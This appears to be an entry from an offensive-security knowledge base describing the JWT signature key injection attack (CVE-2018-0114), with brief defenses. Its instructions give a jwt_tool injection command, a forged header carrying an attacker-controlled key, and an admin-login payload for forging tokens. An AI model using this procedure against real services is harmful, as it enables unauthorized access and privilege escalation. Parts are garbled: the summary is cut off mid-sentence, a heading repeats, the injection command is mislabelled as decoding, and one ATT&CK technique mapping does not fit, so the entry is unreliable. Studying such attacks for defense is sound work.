---
id: 735072e9-7013-4c52-9a09-f2710344d62b
name: JWT Signature Key Injection Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.704730+00:00'
updated_at: '2023-04-10T20:22:33.819733+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
- '[[Steal Application Access Token|T1528 - Steal Application Access Token]]'
tags:
- '[[JWT - JSON Web Token]]'
- '[[JWT Signature]]'
- '[[JWT Signature - Key Injection Attack (CVE-2018-0114)]]'
commands:
- '[[Decode JWT]]'
- '[[JWT Token Creation]]'
- '[[JWT Token Payload]]'
- '[[JWT Token Signing]]'
---

# JWT Signature Key Injection Attack

## Summary

The JWT Signature Key Injection Attack is a technique used to bypass the signature verification of a JSON Web Token (JWT) by injecting a new public key into the header of the JWT. This technique abuses the fact that some JWT libraries allow the public key to be dynamically loaded from the header of

## Description

# Description

The JWT Signature Key Injection Attack is a technique used to bypass the signature verification of a JSON Web Token (JWT) by injecting a new public key into the header of the JWT. This technique abuses the fact that some JWT libraries allow the public key to be dynamically loaded from the header of the token. By crafting a specially crafted JWT with a new public key, an attacker can bypass the signature verification process and gain access to sensitive information or perform unauthorized actions. This attack can be used to escalate privileges, bypass access controls, and gain access to sensitive data.

## Requirements

1. Access to a JWT library that allows the public key to be dynamically loaded from the header of the token

1. Ability to craft a specially crafted JWT with a new public key

## Defense

1. Implement input validation to ensure that the public key is not dynamically loaded from the header of the token.

1. Implement signature verification with a fixed public key instead of a dynamically loaded public key.

1. Regularly monitor and audit token usage to detect any unauthorized access or actions.

## Objectives

1. Bypass signature verification of a JSON Web Token (JWT)

1. Escalate privileges

1. Bypass access controls

1. Gain access to sensitive data

# Instructions

1. Replace [JWT_HERE] with the JWT you want to inject the new public key into.

**Code**: [[python3 jwt_tool.py [JWT_HERE] -X i]]

> This command extracts the JWT and injects a new public key into the header of the token.

**Command** ([[Decode JWT]]):

```bash
python3 jwt_tool.py [JWT_HERE] -X i
```

2. Replace the values in the JWT header and payload with your own values.

**Code**: [[{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
   ]]

> This command crafts a specially crafted JWT with a new public key and payload.

**Command** ([[JWT Token Creation]]):

```bash
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
```

**Command** ([[JWT Token Payload]]):

```bash
{"login":"admin"}.
```

**Command** ([[JWT Token Signing]]):

```bash
[Signed with new Private key; Public key injected]
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]
- [[Steal Application Access Token|T1528 - Steal Application Access Token]]

## Commands Used

- [[Decode JWT]]
- [[JWT Token Creation]]
- [[JWT Token Payload]]
- [[JWT Token Signing]]

## Tags

- [[JWT - JSON Web Token]]
- [[JWT Signature]]
- [[JWT Signature - Key Injection Attack (CVE-2018-0114)]]
